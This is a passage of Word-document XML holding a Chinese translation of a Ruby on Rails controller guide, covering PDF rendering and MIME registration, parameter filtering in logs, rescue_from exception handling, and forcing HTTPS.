              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Client.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EEDF58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49F0EDA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respond_to do</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|format|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3AD9B63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format.html</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D30760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format.pdf { render :pdf</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; generate_pdf(@client) }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="572CFC2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73D1550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40B8D67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7F98DB1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为使此例工作，你必须添加 PDF MIME 类型到 Rails 中。添加下面一行到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/initializers/mime_types.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5376"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="65469902" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="261A9804" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="78914586"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Mime::Type.register "application/pdf", :pdf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6068CD7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配置文件不会在每次请求被重载，所以你必须重启服务器来使它们的改动生效。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F9F7C7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现在用户可以请求来获得一个 client 的 PDF 版本，只要通过添加 “.pdf” 到 URL中：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2376"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="03840DE6" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1475BA98" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="99227855"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>GET /clients/1.pdf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7C15D843"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12 参数过滤</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D168CE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为每套环境在 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>log</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件夹中保留一个日志文件。在 debug 时，对你想知道在你的应用中真正发生了什么极为有用，但是在一个线上的应用中你可能不想每一点点信息都被存入日志文件中。你可以通过添加到应用配置中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.filter_parameters</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 后过滤掉特定的请求参数到你的日志文件中。这些参数在日志中会被标记 [FILTERED] 。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4656"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="298E9FDF" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15278E66" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1110004676"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.filter_parameters &lt;&lt; :password</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5F97E60E"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13 异常处理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6161A23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很有可能你的应用将会包含 bug 或是抛出一个需要被处理的异常。举例来说，如果用户跟随一个链接到一个数据库中不再存在的 resource ，Active Record 会抛出 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveRecord::RecordNotFound</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 异常。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79981C5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Rails 的默认异常处理对所有异常会显示一个 “500 Server Error” 信息。如果请求是在本地创建的，一个详细的回溯和一些附加信息会被显示那样你就可以找出什么出错了然后处理它。如果请求是远程的，Rails 会仅仅显示一个简单的 “500 Server Error” 信息给用户，或一个 “404 Not Found” 如果是路由错误或一条记录无法被找到。有时你可能想要定制这些信息如何被捕捉以及它们如何被显示给用户。在一个 Rails 应用中有几个等级的错误处理可用：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B846769"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13.1 默认 500 和 404 模版</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0180025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一个生产环境应用默认情况会渲染不是一个 404 就是一个 500 错误信息。这些信息包含在 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>public</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件夹里的静态 HTML 文件中，分别是 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>404.html</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>500.html</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。你可以定制这些文件以添加一些额外信息和版型，但是记住它们是静态的；例如，你不能在它们中使用 RHTML 或 版型，只能是简单 HTML。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26E652E5"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 xml:space="preserve">13.2 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rescue_from</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D06D0C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如果你在捕捉错误时想要做一些更具体一点，你可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rescue_from</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，在整个控制器和它的子类别中处理某一种特定类型（或多种）异常。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3983CFA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当一个异常发生时，它会被一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rescue_from</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指令捕捉到，这个异常对象会被传递到处理者那里。处理者可以是一个方法或一个通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:with</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项传递的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Proc</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象。你也可以直接使用一个 block 来代替一个显式的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Proc</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C2E14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下面是如何使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rescue_from</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来拦截所有 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveRecore::RecordNotFound</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 错误并做一些处理。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="51473FCD" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F4890C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ApplicationController &lt; ActionController::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DE6AFB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rescue_from ActiveRecord::RecordNotFound, :with</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :record_not_found</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55EF79E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5F25B51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private</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44A1297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75BFB81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record_not_found</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5705C3E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render :text</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "404 Not Found", :status</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 404</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1339AA2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26421C5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35678CC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当然，此例除了更详尽以外并未对默认的异常处理做任何改进，但是一旦你可以捕捉到所有这些异常，你就可以对它们随心所欲了。举例来说，你可以创建当一个用户对应用的特定区域没有权限是抛出的异常类别：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8136"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="05460D1B" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6090074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ApplicationController &lt; ActionController::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1073307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rescue_from User::NotAuthorized, :with</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :user_not_authorized</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E1715A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46A5978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private</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59B21DC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212D6D6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user_not_authorized</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66CAE9E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flash[:error] = "You don't have access to this section."</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="117C027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redirect_to :back</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D771D8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3DB52B9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p w14:paraId="6A55643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68F28C9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ClientsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C07507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检查该用户具有正确的授权来存取客户。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FA600F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before_filter :check_authorization</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E804F5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3B6F777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注意动作如何不用担心所有这些验证的东西。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E47146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edit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47E69D2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@client</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Client.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7527533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00B0E08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1CA1F8F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private</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CD869A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655B10A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如果该用户未被授权，就抛出异常。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="719B20C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check_authorization</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6745AB1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raise</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>User::NotAuthorized unless</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>current_user.admin?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76C0825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525440C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6B716D1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某些特定的异常只能被 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ApplicationController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类别捕获，因为它们是在控制器被初始化和动作被执行之前抛出的。参考 Pratik Naik 在该主题的"文章":http://m.onkey.org/2008/7/20/rescue-from-dispatching 获得更多信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79740D75"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14 强制 HTTPS 协议</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7435418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有时由于安全原因，你可能想要强制指定的控制器只可通过 HTTPS 协议获得权限。</w:t>
      </w:r>
      <w:r w:rsidRPr="00CA6AB6">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">Rails 3.1 之后你可以在你的控制器中使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="00CA6AB6">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>force_ssl</w:t>
      </w:r>
      <w:r w:rsidRPr="00CA6AB6">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法来强制执行它</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">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2856"/>
      </w:tblGrid>
